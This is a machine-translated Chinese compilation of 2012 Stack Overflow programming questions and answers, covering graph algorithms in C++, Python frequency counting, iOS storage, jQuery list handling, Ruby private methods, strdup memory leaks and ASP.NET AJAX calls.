           received: 0 times 
```

我认为最有可能的是，原始更新方法确实调用了 update_attributes，然后修改了该代码。这就是为什么现在测试失败了。

# c++ - 记忆保守的最大独立顶点集

> ID：10811955
> 
> 赞同：2
> 
> 时间：2012-05-30T07:38:06.797
> 
> 标签：c++, algorithm, graph, graph-theory, stl-algorithm

我想为无向图中设置的最大独立顶点找到一种内存保守但有效的算法。

传统算法使用辅助数据结构（原始图的副本）来实现它。我想避免这种并行结构，因为内存分配对于实时实现来说很慢，而且我有一些内存边界。我只想用布尔标签标记 MIS 中的节点。可能吗？

请注意，我不想要**最大**独立集，而是**最大**独立集。

PS 我知道这个问题与语言无关，但我使用 C++ 和 STL 进行编码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T15:23:58.643

如果每个节点 i 只有布尔标签（i），这是一个解决方案。它需要时间 O(|V|+|E|)，其中 |V| 是节点数，|E| 是输入图中的边数。

```
For all nodes v
   set label(v)=false;
For all nodes v
   if (all neighbors w of v have label(w)=false)
      set label(v)=true 
```

label(v)=true 的节点 v 是一个最大独立集。它们是独立的，因为根据构造，任何带标签的节点 v 都不能有带标签的邻居。它们是一个最大集合，因为您只是激活标签，并且如果另一个已标记的邻居 w 阻止了节点 v，则只会留下未标记的节点。

优化说明：如果节点编号为 1...n，您只需检查邻居 w=1..v-1，因为任何其他 w 都不能具有 label(w)=true。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T16:53:59.827

我使用划痕`vector`或`deque<bool>`用于指示元素使用哪些顶点，或边，或刻面，...

```
std::deque<bool> used(vertex.size(), false);
for (size_t e = 0; e < edge.size(); ++e)
{
    used[edge[e].v1] = true;
    used[edge[e].v2] = true;
} 
```

Now used == true 表示所有使用的顶点。如果你愿意，其他的可以折叠出来。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T14:37:41.253

如果不确切知道您的数据结构是什么，就很难回答这类问题。就地图操作的常用技巧是从指针中窃取两个原本为零的位，并对图结构进行可逆更改，但我不确定它们如何应用在这里。

从阅读您所写的内容来看，似乎没有遍历图表中的节点的方法。您如何代表 DFS 等的堆栈？

# python - 模式列表中数字的最大值

> ID：10811958
> 
> 赞同：0
> 
> 时间：2012-05-30T07:38:17.887
> 
> 标签：python, list, frequency

所以我从一个列表中找到了数字的频率，并创建了一个这样的列表 [2:3 , 25:1, 22:4, 5:2, 5:2] 之后我想做的是有一个for循环检测最大频率（不同的数字可以具有相同的频率），然后打印最高的数字和频率，可能不止一个。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T08:19:17.660

取决于您的数据的结构

```
>>> data = {2:3 , 25:1, 22:4, 5:2, 5:2}
>>> max(data, key = lambda x: data[x])
22 
```

或者

```
>>> data = [(2, 3), (25, 1), (22, 4), (5,2), (5,2)]
>>> max(data, key = lambda x: x[1])
(22, 4) 
```

应该做的伎俩。

**[编辑]**

```
>>> data = {2:3 , 25:4, 22:4, 5:2, 5:2}
>>> max_key = max(data.values())
>>> print [i for i in data if data[i] == max_key]
[22, 25] 
```

# ios - 如何将 html 页面 (URL) 插入 SQLite 数据库？

> ID：10811965
> 
> 赞同：1
> 
> 时间：2012-05-30T07:38:39.630
> 
> 标签：ios, xcode4, uiwebview, sqlite

我正在使用加载在 UIWebView 中的几个 html 页面，当单击 html 页面的 URL 时，有一个添加到收藏夹按钮应该存储在 SQLite 数据库中。如何做到这一点？
提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T08:19:09.987

您可以将它们保存在 NSUserDefaults 中，如下所示：

**保存**

```
 NSUserDefaults *prefs = [NSUserDefaults standardUserDefaults]; 
```

// 保存一个 NSString

```
[prefs setObject:@"TextToSave" forKey:@"keyToLookupString"];
[prefs synchronize]; 
```

**检索**

```
NSUserDefaults *prefs = [NSUserDefaults standardUserDefaults]; 
```

**// 获取一个 NSString**

```
 NSString *myString = [prefs stringForKey:@"keyToLookupString"]; 
```

然后在您的代码中使用它来检索 html 页面的 URL

将其与您的 webView 链接：

```
NSString *myString = [prefs stringForKey:@"keyToLookupString"];
NSURL *url = [NSURL URLWithString:myString];
NSURLRequest *requestObj = [NSURLRequest requestWithURL:url];
[webView loadRequest:requestObj]; 
```

# java - 如何将唯一 id 传递到所有 JMS 消息 weblogic

> ID：10811978
> 
> 赞同：1
> 
> 时间：2012-05-30T07:39:49.010
> 
> 标签：java, jms, integration, weblogic-10.x, osb

我正在努力解决一个问题，但尚未解决。在 Oracle WebLogic OSB 中，我有一堆代理服务。假设他们每个人都应该将一个参数传递给一个具有唯一标识符的 jms 队列，这样我就可以在 Java 的服务器端将多条消息聚合在一起。我不知道如何在代理之间传递这个唯一的标头，这样它就不会丢失。你们会在这里帮我吗？非常感谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T09:32:16.647

您可以使用 GroupId 来聚合属于某个组的消息。此[链接](http://www.ibm.com/developerworks/websphere/library/techarticles/0602_currie/0602_currie.html)讨论在 IBM MQ 中对消息进行分组。WebLogic 中也一定有类似的东西。

# jquery - Jquery限制列表元素，隐藏第一个孩子之后

> ID：10811982
> 
> 赞同：0
> 
> 时间：2012-05-30T07:40:05.730
> 
> 标签：jquery, onchange, listitem

我想要实现的是显示十个列表项，如果单击下一个列表元素以隐藏第一个元素，那么列表将始终包含十个元素

HTML

```
<div id="showMY">
   <ul>
   </ul>​
</div> 
```

jQuery

```
 $("#dropList").on("change", function () {

        var dropValue = $("#dropList").val();

        $.get("getValues.php", 
        { 
            a: dropValue
        },
        function(data)
        {
            $("#showMY").append(data);

        });

    }); 
```

返回的值为

```
<li><a href="#">Value</a></li> 
```

提前致谢 ;）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T08:01:28.400

这应该可以解决问题：

HTML：

```
<select id="dropList">
    <option value="item1">item1</option>
    <option value="item2">item2</option>
    <option value="item3">item3</option>
    <option value="item4">item4</option>
    <!-- etc -->
</select>

<ul id="showMY">
</ul> 
```

JS：

```
$(function() {
    $("#dropList").change(function() {
        var value = $("#dropList").val();
        $.get("getValues.php", {a: value}, function(data) {
            $("#showMY").append('<li><a href="#">' + data + '</a></li>');
            if($("#showMY li").length > 10) {
                $("#showMY li:first:visible").hide();
            }
        });
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T08:04:37.640

您可以使用以下代码实现此目的

**HTML：**

```
<select id="drop">
    <option val="item 11"></option>
        <option val="item 12">item 12</option>
        <option val="item 13"> item 13</option>
        <option val="item 14">item 14</option>
        <option val="item 15">item 15</option>
        <option val="item 16">item 16</option>
        <option val="item 17">item 17</option>
        <option val="item 18">item 18</option>
        <option val="item 19">item 19</option>
        <option val="item 20">item 20</option>

</select>

<ul id="container">
<li>Item 1</li>
<li>Item 2</li>
<li>Item 3</li>
<li>Item 4</li>
<li>Item 5</li>
<li>Item 6</li>
<li>Item 7</li>
<li>Item 8</li>
<li>Item 9</li>
<li>Item 10</li>
</ul> 
```

**jQuery：**

```
$('#drop').on('change',function(){
   var dropVal = $(this).val();
   $('ul#container li:visible').first().hide();
    $('ul#container').append("<li> "+ (dropVal) +" "); 
}); 
```

`$.get`您可以通过在代码中添加调用来修改它以满足您的需要。

[工作小提琴](http://jsfiddle.net/joycse06/WjY2m/3/)

# ruby - 从 Scraper 编写 Web 应用程序的注意事项

> ID：10811983
> 
> 赞同：0
> 
> 时间：2012-05-30T07:40:06.807
> 
> 标签：ruby, screen-scraping

我目前正在尝试编写一个小型应用程序，该应用程序基本上将寄生于另一个网站（我学校的年级门户网站）的信息，基本上是为了使另一个网站上的内容更有用。我现在有一个用 Ruby 和 Mechanize 编写的概念验证。

然而，我正试图弄清楚从这里去哪里。运行概念验证需要*很长时间*，有时需要一分钟才能完成登录。我不怀疑由于网站的编写方式（它很旧），我可以让它更快。

在尝试将这个概念验证变成一个成熟的应用程序时，我应该关注什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-31T03:24:21.437

当你刮痧时，你基本上是在另一个孩子的家里玩。他们可以（并且将）在闲暇时改变事情。您将需要大量的错误检查。我建议您在发布数据之前将数据抓取并保存到暂存环境中，并确保您的用户知道他们在获取数据时可能会出现间歇性延迟，而您在站点更改后疯狂地尝试恢复您的抓取程序。

# ruby - 为什么 Ruby 不允许我在私有方法中将 self 指定为接收者？

> ID：10811986
> 
> 赞同：5
> 
> 时间：2012-05-30T07:40:13.863
> 
> 标签：ruby, private, public

Ruby 作为一种面向对象的语言。这意味着无论我发送什么消息，我都严格将其发送到类的某个对象/实例上。

例子：

```
 class Test
   def test1
    puts "I am in test1\. A public method"
    self.test2
   end

   def test2
    puts "I am in test2\. A public Method"
   end
 end 
```

有意义我`test2`在`self`对象上调用方法

但我不能这样做

```
 class Test
   def test1
    puts "I am in test1\. A public method"
    self.test2 # Don't work
    test2 # works. (where is the object that I am calling this method on?)
   end

   private
   def test2
    puts "I am in test2\. A private Method"
   end
 end 
```

我什么时候`test2`可以`public method`调用它`self`（很公平，一个发送给 self 对象的方法）。但是什么时候`test2`我`private method`不能自己打电话。那么我发送方法的对象在哪里？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-30T08:21:12.220

### 问题

在 Ruby 中，不能用显式接收器*直接*调用私有方法；self 在这里没有得到任何特殊待遇。根据定义，当您调用时，`self.some_method`您将 self 指定为显式接收者，因此 Ruby 说“不！”

### 解决方案

Ruby 有其方法查找的规则。规则可能有更规范的来源（除了转到 Ruby 源），但这篇[博](http://blog.rubybestpractices.com/posts/gregory/031-issue-2-method-lookup.html)文在顶部列出了规则：

```
1) Methods defined in the object’s singleton class (i.e. the object itself)
2) Modules mixed into the singleton class in reverse order of inclusion
3) Methods defined by the object’s class
4) Modules included into the object’s class in reverse order of inclusion
5) Methods defined by the object’s superclass, i.e. inherited methods 
```

换句话说，私有方法首先在 self 中查找，而不需要（或允许）显式接收器。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-30T10:34:44.050

> 我发送方法的对象在哪里

是`self`。如果您不指定接收者，则接收者为`self`.

Ruby 中的定义`private`是私有方法只能在没有接收者的情况下调用，即使用`self`. 有趣的是，该方法完全没有打扰您，该`puts`方法也是私有实例方法；-)

注意：此规则有一个例外。*可以*使用显式接收器调用私有设置器，只要接收器是`self`. 事实上，它们*必须*用显式接收器调用，否则局部变量赋值会产生歧义：

```
foo = :fortytwo      # local variable
self.foo = :fortytwo # setter 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-30T07:46:43.873

`self`表示您所在的对象的当前实例。

```
class Test
  def test1
    self
  end
end 
```

调用`Test.new.test1`将返回类似`#<Test:0x007fca9a8d7928>`.
这是您当前使用的 Test 对象的实例。

将方法定义为私有意味着它只能在当前对象**内部使用。**
使用 时`self.test2`，您将离开当前对象（获取实例）并调用该方法。
因此，您正在调用私有方法，就好像您不在对象中一样，这就是您不能这样做的原因。

当您不指定`self`时，您将留在当前对象内。
所以你可以调用该方法。Ruby 足够聪明，知道这`test2`是一个方法而不是一个变量并调用它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-06-14T13:48:40.680

这在 Ruby 2.7（2019 年 12 月）中已更改：`self.foo()`现在对私有方法也有效`foo`。

参考：

*   [https://rubyreferences.github.io/rubychanges/2.7.html#selfprivate_method](https://rubyreferences.github.io/rubychanges/2.7.html#selfprivate_method)
*   [https://bugs.ruby-lang.org/issues/11297](https://bugs.ruby-lang.org/issues/11297)
*   [https://bugs.ruby-lang.org/issues/16123](https://bugs.ruby-lang.org/issues/16123)

# iphone - 我有内存泄漏，负责的框架是 strdup。谁能给我一些线索？

> ID：10811989
> 
> 赞同：4
> 
> 时间：2012-05-30T07:40:20.220
> 
> 标签：iphone, objective-c, c, memory-leaks

当我用仪器检测时出现内存泄漏。我对内存管理没有太多经验，所以我无法弄清楚这个问题的可能原因是什么，内存泄漏如下：

![在此处输入图像描述](../Images/286e83cf00f3ccdc6165f368b0fc2cb9.png)

![在此处输入图像描述](../Images/3534a744f146074851bb50eafc957631.png)

我想知道这种内存泄漏的可能原因。有谁能给我一些线索吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:43:14.067

`strdup`在内部使用`malloc`，所以任何已经被`strdup`-ed 的东西都必须使用`free`.

例如：

```
char *duplicate = strdup("abcdef");
...
free(duplicate); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:53:08.823

`strdup()`*是一个库函数，因此您*需要备份回溯，直到找到代码中的调用者。在那里你会发现一个导致内存被分配的库调用——它应该在你的程序的其他地方有一个相应的释放调用。

（释放函数不一定是直接调用`free()`- 例如，如果您调用`getaddrinfo()`库函数，则相应的释放函数是`freeaddrinfo()`）。

# javascript - 从 Javascript 调用 ASP.NET C# 控制器方法

> ID：10811995
> 
> 赞同：1
> 
> 时间：2012-05-30T07:40:48.430
> 
> 标签：javascript, asp.net, asp.net-mvc-3, azure

我在 javascript 文件中有一个 var toto。我想调用一个 C# 控制器方法，它返回一个字符串，当然将结果字符串分配给 toto。
我尝试了一些方法来实现这一点，但似乎没有任何效果。
有人可以向我解释实现这一目标的最简单方法吗？这是一个 Windows Azure 项目。

非常感谢 ！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-30T07:42:39.860

你可以使用 AJAX。例如，使用 jQuery，您可以使用该[`$.getJSON`](http://api.jquery.com/jQuery.getJSON/)方法向控制器操作发送 AJAX 请求，该操作返回 JSON 编码结果，并在成功回调中使用结果：

```
$.getJSON('/home/someaction', function(result) {
    var toto = result.SomeValue;
    alert(toto);
}); 
```

和控制器动作：

```
public ActionResult SomeAction() 
{
    return Json(new { SomeValue = "foo bar" }, JsonRequestBehavior.AllowGet);
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-30T07:44:28.943

您必须使用 JSON：

**控制器**

```
public class PersonController : Controller
{
   [HttpPost]
   public JsonResult Create(Person person)
   {
      return Json(person); //dummy example, just serialize back the received Person object
   }
} 
```

**Javascript**

```
$.ajax({
   type: "POST",
   url: "/person/create",
   dataType: "json",
   contentType: "application/json; charset=utf-8",
   data: jsonData,
   success: function (result){
      console.log(result); //log to the console to see whether it worked
   },
   error: function (error){
      alert("There was an error posting the data to the server: " + error.responseText);
   }
}); 
```

阅读更多：[http ://blog.js-development.com/2011/08/posting-json-data-to-aspnet-mvc-3-web.html#ixzz1wKwNnT34](http://blog.js-development.com/2011/08/posting-json-data-to-aspnet-mvc-3-web.html#ixzz1wKwNnT34)